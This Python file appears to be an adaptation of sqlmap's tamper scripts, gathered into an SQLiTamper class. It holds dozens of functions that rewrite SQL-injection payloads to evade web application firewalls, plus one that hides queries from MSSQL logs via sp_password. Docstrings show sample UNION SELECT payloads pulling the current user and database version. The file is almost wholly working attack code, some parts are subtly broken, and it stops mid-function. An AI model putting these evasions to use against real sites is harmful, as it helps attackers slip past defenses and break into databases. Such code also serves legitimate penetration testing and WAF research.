
import collections
import os
import random
import re
import string
import random
import binascii
import codecs

IGNORE_SPACE_AFFECTED_KEYWORDS = ("CAST", "COUNT", "EXTRACT", "GROUP_CONCAT", "MAX", "MID", "MIN", "SESSION_USER", "SUBSTR", "SUBSTRING", "SUM", "SYSTEM_USER", "TRIM")

class OrderedSet(collections.MutableSet):
    """
    This class defines the set with ordered (as added) items
    >>> foo = OrderedSet()
    >>> foo.add(1)
    >>> foo.add(2)
    >>> foo.add(3)
    >>> foo.pop()
    3
    >>> foo.pop()
    2
    >>> foo.pop()
    1
    """

    def __init__(self, iterable=None):
        self.end = end = []
        end += [None, end, end]         # sentinel node for doubly linked list
        self.map = {}                   # key --> [key, prev, next]
        if iterable is not None:
            self |= iterable

    def __len__(self):
        return len(self.map)

    def __contains__(self, key):
        return key in self.map

    def add(self, value):
        if value not in self.map:
            end = self.end
            curr = end[1]
            curr[2] = end[1] = self.map[value] = [value, curr, end]

    def discard(self, value):
        if value in self.map:
            value, prev, next = self.map.pop(value)
            prev[2] = next
            next[1] = prev

    def __iter__(self):
        end = self.end
        curr = end[2]
        while curr is not end:
            yield curr[0]
            curr = curr[2]

    def __reversed__(self):
        end = self.end
        curr = end[1]
        while curr is not end:
            yield curr[0]
            curr = curr[1]

    def pop(self, last=True):
        if not self:
            raise KeyError('set is empty')
        key = self.end[1][0] if last else self.end[2][0]
        self.discard(key)
        return key

    def __repr__(self):
        if not self:
            return '%s()' % (self.__class__.__name__,)
        return '%s(%r)' % (self.__class__.__name__, list(self))

    def __eq__(self, other):
        if isinstance(other, OrderedSet):
            return len(self) == len(other) and list(self) == list(other)
        return set(self) == set(other)

class SQLiTamper():
    def __init__(self):
        self._All = [self.chardoubleencode, self.versionedmorekeywords, self.versionedkeywords, self.uppercase, self.unmagicquotes, \
                    self.unionalltounion, self.symboliclogical, self. space2randomblank, self.space2plus, self.space2mysqldash, \
                    self.space2mysqlblank, self.space2mssqlhash, self.space2mssqlblank, self.space2morehash, self.space2morecomment, \
                    self.space2hash, self.space2dash, self.space2comment, self.sp_password, self.randomcomments, self.randomcase, self.plus2fnconcat, \
                    self.plus2concat, self.percentage, self.overlongutf8more, self.overlongutf8, self.multiplespaces, self.modsecurityzeroversioned, \
                    self.modsecurityversioned, self.lowercase, self.least, self.informationschemacomment, self.ifnull2ifisnull, self.ifnull2casewhenisnull, \
                    self.htmlencode, self.hex2char, self.halfversionedmorekeywords, self.greatest, self.escapequotes, self.equaltolike, self.concat2concatws, \
                    self.commentbeforeparentheses, self.commalessmid, self.commalesslimit, self.charunicodeescape, self.charunicodeencode, self.charencode, \
                    self.bluecoat, self.between, self.appendnullbyte, self.apostrophenullencode, self.apostrophemask, self.e0UNION,
                    self.misunion, self.schemasplit, self.binary, self.dunion, self.equaltorlike]
        self._General = [self.chardoubleencode, self.unmagicquotes, self.unionalltounion, self.symboliclogical, \
                        self.space2plus, self.randomcomments, self.randomcase, self.overlongutf8more, self.overlongutf8, \
                        self.multiplespaces, self.htmlencode, self.escapequotes, self.charunicodeescape, self.apostrophenullencode, \
                        self.apostrophemask, self.between, self.charencode, self.charunicodeencode, self.equaltolike, self.greatest, \
                        self.ifnull2ifisnull, self.percentage, self.space2randomblank, self.space2comment]
        self._MSAccess = [self.appendnullbyte, self.between, self.bluecoat, self.charencode, self.charunicodeencode, self.concat2concatws, \
                        self.equaltolike, self.greatest, self.halfversionedmorekeywords, self.ifnull2ifisnull, self.modsecurityversioned, \
                        self.modsecurityzeroversioned, self.multiplespaces, self.percentage, self.randomcase, self.space2comment, self.space2hash, \
                        self.space2morehash, self.space2mysqldash, self.space2plus, self.space2randomblank, self.unionalltounion, self.unmagicquotes, \
                        self.versionedkeywords, self.versionedmorekeywords]
        self._MSSQL = [self.uppercase, self.space2randomblank, self.space2mysqldash, self.space2mssqlhash, self.space2mssqlblank, \
                        self.space2dash, self.space2comment, self.sp_password, self.plus2fnconcat, self.plus2concat, self.percentage, \
                        self.lowercase, self.equaltolike, self.commentbeforeparentheses, self.charunicodeencode, self.charencode, \
                        self.between, self.greatest, self.multiplespaces, self.randomcase, self.space2plus, self.unionalltounion, \
                        self.unmagicquotes, self.e0UNION]
        self._MySQL = [self.versionedmorekeywords, self.versionedkeywords, self.uppercase, self.space2randomblank, self.space2mysqldash, \
                        self.space2mysqlblank, self.space2mssqlhash, self.space2morehash, self. space2morecomment, self. space2hash, \
                        self.space2comment, self.percentage, self.modsecurityzeroversioned, self.modsecurityversioned, self.lowercase, \
                        self.least, self.informationschemacomment, self.ifnull2ifisnull, self.ifnull2casewhenisnull, self.hex2char, \
                        self.halfversionedmorekeywords, self.greatest, self.equaltolike, self.concat2concatws, self.commentbeforeparentheses, \
                        self.commalessmid, self.commalesslimit, self.charunicodeencode, self.charencode, self.bluecoat, self.between, self.multiplespaces, \
                        self.randomcase, self.space2comment, self.space2plus, self.unionalltounion, self.unmagicquotes, self.e0UNION,
                        self.misunion, self.schemasplit, self.binary, self.equaltorlike]
        self._Oracle = [self.uppercase, self.space2randomblank, self.space2comment, self.lowercase, self.least, self.greatest, \
                        self.commentbeforeparentheses, self.charencode, self.between, self.equaltolike, self.multiplespaces, \
                        self.randomcase, self.space2plus, self.unionalltounion, self.unmagicquotes, self.dunion]
        self._PostgreSQL= [self.uppercase, self.substring2leftright, self.space2randomblank, self.space2comment, self.percentage, \
                        self.lowercase, self.least, self.greatest, self.commentbeforeparentheses, self.charunicodeencode, \
                        self.charencode, self.between, self.equaltolike, self.multiplespaces, self.randomcase, self.space2plus]
        self._SAP_MaxDB = [self.ifnull2ifisnull, self.ifnull2casewhenisnull, self.randomcase, self.space2comment, self.space2plus, \
                            self.unionalltounion, self.unmagicquotes]
        self._SQLite = [self.space2dash, self.ifnull2ifisnull, self.ifnull2casewhenisnull, self.multiplespaces, self.randomcase, \
                        self.space2comment, self.space2plus, self.unionalltounion, self.unmagicquotes]
        self.keywords = set(self.getFileItems('keywords.txt'))
        self.techniques = {
            'All':self._All,
            'General':self._General,
            'MSAccess':self._MSAccess,
            'MSSQL':self._MSSQL,
            'MySQL':self._MySQL,
            'Oracle':self._Oracle,
            'PostgreSQL':self._PostgreSQL,
            'SAP_MaxDB':self._SAP_MaxDB,
            'SQLite':self._SQLite
        }

    def randomRange(self, start=0, stop=1000, seed=None):
        randint = random.randint
        return int(randint(start, stop))

    def zeroDepthSearch(self, expression, value):
        """
        Searches occurrences of value inside expression at 0-depth level
        regarding the parentheses
        >>> _ = "SELECT (SELECT id FROM users WHERE 2>1) AS result FROM DUAL"; _[zeroDepthSearch(_, "FROM")[0]:]
        'FROM DUAL'
        >>> _ = "a(b; c),d;e"; _[zeroDepthSearch(_, "[;, ]")[0]:]
        ',d;e'
        """

        retVal = []

        depth = 0
        for index in xrange(len(expression)):
            if expression[index] == '(':
                depth += 1
            elif expression[index] == ')':
                depth -= 1
            elif depth == 0:
                if value.startswith('[') and value.endswith(']'):
                    if re.search(value, expression[index:index + 1]):
                        retVal.append(index)
                elif expression[index:index + len(value)] == value:
                    retVal.append(index)

        return retVal
    
    def getOrds(self, value):
        """
        Returns ORD(...) representation of provided string value
        >>> getOrds(u'fo\\xf6bar')
        [102, 111, 246, 98, 97, 114]
        >>> getOrds(b"fo\\xc3\\xb6bar")
        [102, 111, 195, 182, 98, 97, 114]
        """

        return [_ if isinstance(_, int) else ord(_) for _ in value]

    def getText(self, value, encoding=None):
        """
        Returns textual value of a given value (Note: not necessary Unicode on Python2)
        >>> getText(b"foobar")
        'foobar'
        >>> isinstance(getText(u"fo\\u2299bar"), six.text_type)
        True
        """

        retVal = value

        if isinstance(value, str):
            retVal = self.getUnicode(value, encoding)
        try:
            retVal = str(retVal)
        except:
            pass

        return retVal

    def decodeHex(self, value, binary=True):
        """
        Returns a decoded representation of provided hexadecimal value
        >>> decodeHex("313233") == b"123"
        True
        >>> decodeHex("313233", binary=False) == u"123"
        True
        """

        retVal = value
        try:
            if isinstance(value, str):
                value = self.getText(value)

            if value.lower().startswith("0x"):
                value = value[2:]

            try:
                retVal = codecs.decode(value, "hex")
            except LookupError:
                retVal = binascii.unhexlify(value)

            if not binary:
                retVal = self.getText(retVal)
        except:
            pass
        
        return retVal

    def getUnicode(self, value, encoding=None, noneToNull=False):
        """
        Returns the unicode representation of the supplied value
        >>> getUnicode('test') == u'test'
        True
        >>> getUnicode(1) == u'1'
        True
        """

        if noneToNull and value is None:
            return None

        if isinstance(value, unicode):
            return value
        elif isinstance(value, str):
            return value.encode('utf-8')
        
        return None

    def randomInt(self, length=4, seed=None):
        """
        Returns random integer value with provided number of digits
        >>> random.seed(0)
        >>> self.randomInt(6)
        963638
        """

        choice = random.choice

        return int("".join(choice(string.digits if _ != 0 else string.digits.replace('0', '')) for _ in xrange(0, length)))

    def getFileItems(self, filename, commentPrefix='#', lowercase=False, unique=False):
        """
        Returns newline delimited items contained inside file
        """

        retVal = list()

        if filename:
            filename = filename.strip('"\'')

        try:
            with open(filename, 'r') as f:
                for line in f:
                    if commentPrefix:
                        if line.find(commentPrefix) != -1:
                            line = line[:line.find(commentPrefix)]

                    line = line.strip()

                    if line:
                        if lowercase:
                            line = line.lower()

                        if unique and line in retVal:
                            continue

                        if unique:
                            retVal[line] = True
                        else:
                            retVal.append(line)
        except (IOError, OSError, MemoryError) as ex:
            errMsg = "something went wrong while trying "
            errMsg += "to read the content of file ''" % filename
            raise Exception(errMsg)

        return retVal if not unique else list(retVal.keys())

    def chardoubleencode(self, payload, **kwargs):
        """
        Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
        Notes:
            * Useful to bypass some weak web application firewalls that do not double URL-decode the request before processing it through their ruleset
        >>> tamper('SELECT FIELD FROM%20TABLE')
        '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'
        """

        retVal = payload

        if payload:
            retVal = ""
            i = 0

            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += '%%25%s' % payload[i + 1:i + 3]
                    i += 3
                else:
                    retVal += '%%25%.2X' % ord(payload[i])
                    i += 1

        return retVal

    def versionedmorekeywords(self, payload, **kwargs):
        """
        Encloses each keyword with (MySQL) versioned comment
        Requirement:
            * MySQL >= 5.1.13
        Tested against:
            * MySQL 5.1.56, 5.5.11
        Notes:
            * Useful to bypass several web application firewalls when the
            back-end database management system is MySQL
        >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
        '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
        """

        def process(match):
            word = match.group('word')
            if word.upper() in self.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
                return match.group().replace(word, "/*!%s*/" % word)
            else:
                return match.group()

        retVal = payload

        if payload:
            retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
            retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

        return retVal

    def versionedkeywords(self, payload, **kwargs):
        """
        Encloses each non-function keyword with (MySQL) versioned comment
        Requirement:
            * MySQL
        Tested against:
            * MySQL 4.0.18, 5.1.56, 5.5.11
        Notes:
            * Useful to bypass several web application firewalls when the
            back-end database management system is MySQL
        >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
        '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
        """

        def process(match):
            word = match.group('word')
            if word.upper() in self.keywords:
                return match.group().replace(word, "/*!%s*/" % word)
            else:
                return match.group()

        retVal = payload

        if payload:
            retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=[^\w(]|\Z)", process, retVal)
            retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

        return retVal

    def uppercase(self, payload, **kwargs):
        """
        Replaces each keyword character with upper case value (e.g. select -> SELECT)
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that has poorly written permissive regular expressions
            * This tamper script should work against all (?) databases
        >>> tamper('insert')
        'INSERT'
        """

        retVal = payload

        if payload:
            for match in re.finditer(r"[A-Za-z_]+", retVal):
                word = match.group()

                if word.upper() in self.keywords:
                    retVal = retVal.replace(word, word.upper())

        return retVal

    def unmagicquotes(self, payload, **kwargs):
        """
        Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
        Notes:
            * Useful for bypassing magic_quotes/addslashes feature
        Reference:
            * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
        >>> tamper("1' AND 1=1")
        '1%bf%27-- -'
        """

        retVal = payload

        if payload:
            found = False
            retVal = ""

            for i in xrange(len(payload)):
                if payload[i] == '\'' and not found:
                    retVal += "%bf%27"
                    found = True
                else:
                    retVal += payload[i]
                    continue

            if found:
                _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
                if _ != retVal:
                    retVal = _
                    retVal += "-- -"
                elif not any(_ in retVal for _ in ('#', '--', '/*')):
                    retVal += "-- -"
        return retVal

    def unionalltounion(self, payload, **kwargs):
        """
        Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
        >>> tamper('-1 UNION ALL SELECT')
        '-1 UNION SELECT'
        """

        return payload.replace("UNION ALL SELECT", "UNION SELECT") if payload else payload

    def symboliclogical(self, payload, **kwargs):
        """
        Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
        >>> tamper("1 AND '1'='1")
        "1 %26%26 '1'='1"
        """

        retVal = payload

        if payload:
            retVal = re.sub(r"(?i)\bAND\b", "%26%26", re.sub(r"(?i)\bOR\b", "%7C%7C", payload))

        return retVal

    def substring2leftright(self, payload, **kwargs):
        """
        Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
        Tested against:
            * PostgreSQL 9.6.12
        Note:
            * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)
        >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')
        'LEFT((SELECT usename FROM pg_user)::text,1)'
        >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')
        'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'
        """

        retVal = payload

        if payload:
            match = re.search(r"SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)", payload)

            if match:
                pos = int(match.group(2))
                if pos == 1:
                    _ = "LEFT(%s,1)" % (match.group(1))
                else:
                    _ = "LEFT(RIGHT(%s,%d),1)" % (match.group(1), 1 - pos)

                retVal = retVal.replace(match.group(0), _)

        return retVal

    def space2randomblank(self, payload, **kwargs):
        """
        Replaces space character (' ') with a random blank character from a valid set of alternate characters
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass several web application firewalls
        >>> random.seed(0)
        >>> tamper('SELECT id FROM users')
        'SELECT%0Did%0CFROM%0Ausers'
        """

        # ASCII table:
        #   TAB     09      horizontal TAB
        #   LF      0A      new line
        #   FF      0C      new page
        #   CR      0D      carriage return
        blanks = ("%09", "%0A", "%0C", "%0D")
        retVal = payload

        if payload:
            retVal = ""
            quote, doublequote, firstspace = False, False, False

            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += random.choice(blanks)
                        continue

                elif payload[i] == '\'':
                    quote = not quote

                elif payload[i] == '"':
                    doublequote = not doublequote

                elif payload[i] == ' ' and not doublequote and not quote:
                    retVal += random.choice(blanks)
                    continue

                retVal += payload[i]

        return retVal

    def space2plus(self, payload, **kwargs):
        """
        Replaces space character (' ') with plus ('+')
        Notes:
            * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards
            * This tamper script works against all databases
        >>> tamper('SELECT id FROM users')
        'SELECT+id+FROM+users'
        """

        retVal = payload

        if payload:
            retVal = ""
            quote, doublequote, firstspace = False, False, False

            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += "+"
                        continue

                elif payload[i] == '\'':
                    quote = not quote

                elif payload[i] == '"':
                    doublequote = not doublequote

                elif payload[i] == " " and not doublequote and not quote:
                    retVal += "+"
                    continue

                retVal += payload[i]

        return retVal

    def space2mysqldash(self, payload, **kwargs):
        """
        Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
        Requirement:
            * MySQL
            * MSSQL
        Notes:
            * Useful to bypass several web application firewalls.
        >>> tamper('1 AND 9227=9227')
        '1--%0AAND--%0A9227=9227'
        """

        retVal = ""

        if payload:
            for i in xrange(len(payload)):
                if payload[i].isspace():
                    retVal += "--%0A"
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]

        return retVal

    def space2mysqlblank(self, payload, **kwargs):
        """
        Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
        Requirement:
            * MySQL
        Tested against:
            * MySQL 5.1
        Notes:
            * Useful to bypass several web application firewalls
        >>> random.seed(0)
        >>> tamper('SELECT id FROM users')
        'SELECT%A0id%0CFROM%0Dusers'
        """

        # ASCII table:
        #   TAB     09      horizontal TAB
        #   LF      0A      new line
        #   FF      0C      new page
        #   CR      0D      carriage return
        #   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)
        #           A0      non-breaking space
        blanks = ('%09', '%0A', '%0C', '%0D', '%0B', '%A0')
        retVal = payload

        if payload:
            retVal = ""
            quote, doublequote, firstspace = False, False, False

            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += random.choice(blanks)
                        continue

                elif payload[i] == '\'':
                    quote = not quote

                elif payload[i] == '"':
                    doublequote = not doublequote

                elif payload[i] == " " and not doublequote and not quote:
                    retVal += random.choice(blanks)
                    continue

                retVal += payload[i]

        return retVal

    def space2mssqlhash(self, payload, **kwargs):
        """
        Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
        Requirement:
            * MSSQL
            * MySQL
        Notes:
            * Useful to bypass several web application firewalls
        >>> tamper('1 AND 9227=9227')
        '1%23%0AAND%23%0A9227=9227'
        """

        retVal = ""

        if payload:
            for i in xrange(len(payload)):
                if payload[i].isspace():
                    retVal += "%23%0A"
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]

        return retVal

    def space2mssqlblank(self, payload, **kwargs):
        """
        Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
        Requirement:
            * Microsoft SQL Server
        Tested against:
            * Microsoft SQL Server 2000
            * Microsoft SQL Server 2005
        Notes:
            * Useful to bypass several web application firewalls
        >>> random.seed(0)
        >>> tamper('SELECT id FROM users')
        'SELECT%0Did%0DFROM%04users'
        """

        # ASCII table:
        #   SOH     01      start of heading
        #   STX     02      start of text
        #   ETX     03      end of text
        #   EOT     04      end of transmission
        #   ENQ     05      enquiry
        #   ACK     06      acknowledge
        #   BEL     07      bell
        #   BS      08      backspace
        #   TAB     09      horizontal tab
        #   LF      0A      new line
        #   VT      0B      vertical TAB
        #   FF      0C      new page
        #   CR      0D      carriage return
        #   SO      0E      shift out
        #   SI      0F      shift in
        blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
        retVal = payload

        if payload:
            retVal = ""
            quote, doublequote, firstspace, end = False, False, False, False

            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += random.choice(blanks)
                        continue

                elif payload[i] == '\'':
                    quote = not quote

                elif payload[i] == '"':
                    doublequote = not doublequote

                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    end = True

                elif payload[i] == " " and not doublequote and not quote:
                    if end:
                        retVal += random.choice(blanks[:-1])
                    else:
                        retVal += random.choice(blanks)

                    continue

                retVal += payload[i]

        return retVal

    def space2morehash(self, payload, **kwargs):
        """
        Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
        Requirement:
            * MySQL >= 5.1.13
        Tested against:
            * MySQL 5.1.41
        Notes:
            * Useful to bypass several web application firewalls
            * Used during the ModSecurity SQL injection challenge,
            http://modsecurity.org/demo/challenge.html
        >>> random.seed(0)
        >>> tamper('1 AND 9227=9227')
        '1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227'
        """

        def process(match):
            word = match.group('word')
            randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))

            if word.upper() in self.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
                return match.group().replace(word, "%s%%23%s%%0A" % (word, randomStr))
            else:
                return match.group()

        retVal = ""

        if payload:
            payload = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, payload)

            for i in xrange(len(payload)):
                if payload[i].isspace():
                    randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                    retVal += "%%23%s%%0A" % randomStr
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]

        return retVal

    def space2morecomment(self, payload, **kwargs):
        """
        Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
        Tested against:
            * MySQL 5.0 and 5.5
        Notes:
            * Useful to bypass weak and bespoke web application firewalls
        >>> tamper('SELECT id FROM users')
        'SELECT/**_**/id/**_**/FROM/**_**/users'
        """

        retVal = payload

        if payload:
            retVal = ""
            quote, doublequote, firstspace = False, False, False

            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += "/**_**/"
                        continue

                elif payload[i] == '\'':
                    quote = not quote

                elif payload[i] == '"':
                    doublequote = not doublequote

                elif payload[i] == " " and not doublequote and not quote:
                    retVal += "/**_**/"
                    continue

                retVal += payload[i]

        return retVal

    def space2hash(self, payload, **kwargs):
        """
        Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
        Requirement:
            * MySQL
        Tested against:
            * MySQL 4.0, 5.0
        Notes:
            * Useful to bypass several web application firewalls
            * Used during the ModSecurity SQL injection challenge,
            http://modsecurity.org/demo/challenge.html
        >>> random.seed(0)
        >>> tamper('1 AND 9227=9227')
        '1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227'
        """

        retVal = ""

        if payload:
            for i in xrange(len(payload)):
                if payload[i].isspace():
                    randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                    retVal += "%%23%s%%0A" % randomStr
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]

        return retVal

    def space2dash(self, payload, **kwargs):
        """
        Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
        Requirement:
            * MSSQL
            * SQLite
        Notes:
            * Useful to bypass several web application firewalls
            * Used during the ZeroNights SQL injection challenge,
            https://proton.onsec.ru/contest/
        >>> random.seed(0)
        >>> tamper('1 AND 9227=9227')
        '1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'
        """

        retVal = ""

        if payload:
            for i in xrange(len(payload)):
                if payload[i].isspace():
                    randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                    retVal += "--%s%%0A" % randomStr
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]

        return retVal

    def space2comment(self, payload, **kwargs):
        """
        Replaces space character (' ') with comments '/**/'
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass weak and bespoke web application firewalls
        >>> tamper('SELECT id FROM users')
        'SELECT/**/id/**/FROM/**/users'
        """

        retVal = payload

        if payload:
            retVal = ""
            quote, doublequote, firstspace = False, False, False

            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += "/**/"
                        continue

                elif payload[i] == '\'':
                    quote = not quote

                elif payload[i] == '"':
                    doublequote = not doublequote

                elif payload[i] == " " and not doublequote and not quote:
                    retVal += "/**/"
                    continue

                retVal += payload[i]

        return retVal

    def sp_password(self, payload, **kwargs):
        """
        Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
        Requirement:
            * MSSQL
        Notes:
            * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure
            * Reference: http://websec.ca/kb/sql_injection
        >>> tamper('1 AND 9227=9227-- ')
        '1 AND 9227=9227-- sp_password'
        """

        retVal = ""

        if payload:
            retVal = "%s%ssp_password" % (payload, "-- " if not any(_ if _ in payload else None for _ in ('#', "-- ")) else "")

        return retVal

    def randomcomments(self, payload, **kwargs):
        """
        Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
        >>> import random
        >>> random.seed(0)
        >>> tamper('INSERT')
        'I/**/NS/**/ERT'
        """

        retVal = payload

        if payload:
            for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
                word = match.group()

                if len(word) < 2:
                    continue

                if word.upper() in self.keywords:
                    _ = word[0]

                    for i in xrange(1, len(word) - 1):
                        _ += "%s%s" % ("/**/" if self.randomRange(0, 1) else "", word[i])

                    _ += word[-1]

                    if "/**/" not in _:
                        index = self.randomRange(1, len(word) - 1)
                        _ = word[:index] + "/**/" + word[index:]

                    retVal = retVal.replace(word, _)

        return retVal

    def randomcase(self, payload, **kwargs):
        """
        Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
            * SQLite 3
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that has poorly written permissive regular expressions
            * This tamper script should work against all (?) databases
        >>> import random
        >>> random.seed(0)
        >>> tamper('INSERT')
        'InSeRt'
        >>> tamper('f()')
        'f()'
        >>> tamper('function()')
        'FuNcTiOn()'
        >>> tamper('SELECT id FROM `user`')
        'SeLeCt Id FrOm `user`'
        """

        retVal = payload

        if payload:
            for match in re.finditer(r"\b[A-Za-z_]{2,}\b", retVal):
                word = match.group()

                if (word.upper() in self.keywords and re.search(r"(?i)[`\"'\[]%s[`\"'\]]" % word, retVal) is None) or ("%s(" % word) in payload:
                    while True:
                        _ = ""

                        for i in xrange(len(word)):
                            _ += word[i].upper() if self.randomRange(0, 1) else word[i].lower()

                        if len(_) > 1 and _ not in (_.lower(), _.upper()):
                            break

                    retVal = retVal.replace(word, _)

        return retVal

    def plus2fnconcat(self, payload, **kwargs):
        """
        Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
        Tested against:
            * Microsoft SQL Server 2008
        Requirements:
            * Microsoft SQL Server 2008+
        Notes:
            * Useful in case ('+') character is filtered
            * https://msdn.microsoft.com/en-us/library/bb630290.aspx
        >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
        'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'
        >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
        '1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe'
        """

        retVal = payload

        if payload:
            match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
            if match:
                old = match.group(0)
                parts = []
                last = 0

                for index in self.zeroDepthSearch(old, '+'):
                    parts.append(old[last:index].strip('+'))
                    last = index

                parts.append(old[last:].strip('+'))
                replacement = parts[0]

                for i in xrange(1, len(parts)):
                    replacement = "{fn CONCAT(%s,%s)}" % (replacement, parts[i])

                retVal = retVal.replace(old, replacement)

        return retVal

    def plus2concat(self, payload, **kwargs):
